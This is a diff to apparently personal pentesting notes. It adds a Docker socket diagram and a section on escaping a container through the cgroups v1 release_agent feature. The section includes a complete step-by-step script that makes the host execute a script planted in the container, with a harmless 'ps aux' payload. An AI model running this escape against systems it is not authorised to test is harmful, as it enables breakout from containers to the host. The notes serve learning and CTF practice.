@@ -173,6 +173,10 @@ We can then search for sensitive files. For example, SSH keys are interesting be
 
 ### **Docker Sockets**
 
+<figure><img src=".gitbook/assets/docker-socket-daemon-diagram.svg" alt=""><figcaption></figcaption></figure>
+
+
+
 A Docker socket is a special file that allows processes to communicate with the Docker daemon. On Linux, the Docker daemon commonly uses a Unix socket such as `/var/run/docker.sock`.
 
 When we run a command with the Docker CLI, the client communicates with the Docker daemon through this socket. The daemon then performs the requested action, such as creating, starting, or managing containers.
@@ -255,5 +259,55 @@ root@new-container:/# ls /hostsystem/
 
 
 
+#### cgroups v1 `release_agent`
 
+This technique abuses a legacy feature of **cgroups v1** called `notify_on_release`. When this feature is enabled, we can configure a `release_agent` that points to a script accessible from the host. When the last process in the cgroup exits, the kernel can execute the `release_agent` with host-level privileges.
+
+The important point is that this technique depends on **cgroups v1** being available on the host. Modern Linux systems commonly use **cgroups v2**, so this technique will not work in those environments.
+
+For more information, check out this video:
+
+[https://www.youtube.com/watch?v=\_dhONyAk4es](https://www.youtube.com/watch?v=_dhONyAk4es)
+
+#### Check the cgroup Version
+
+First, check which cgroup version is being used:
+
+```bash
+mount | grep cgroup
+```
+
+<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+In my case, the system is using **cgroups v2**, so this technique will not work.
+
+However, when testing older systems or CTF machines, we may still encounter **cgroups v1**, which makes `release_agent` an interesting technique to investigate.
+
+#### Exploitation
+
+If cgroups v1 is available, we can try the following:
+
+```bash
+# 1. Mount the cgroup filesystem and create a child cgroup 'x'
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+# 2. Enable notification on release for the new cgroup
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# 3. Find the container's path on the host, and set it as the release_agent script
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+# 4. Create the malicious script (/cmd) in the container's shared filesystem.
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd   # The command to run on the host
+chmod a+x /cmd
+
+# 5. Execute a process in the cgroup 'x' that immediately exits, triggering the payload
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+The payload in this example runs `ps aux` and saves the output to the `output` file. This gives us a simple way to verify whether the `release_agent` executed in the host context.
+
+If the technique works, we should be able to find the generated `output` file on the host filesystem.
 
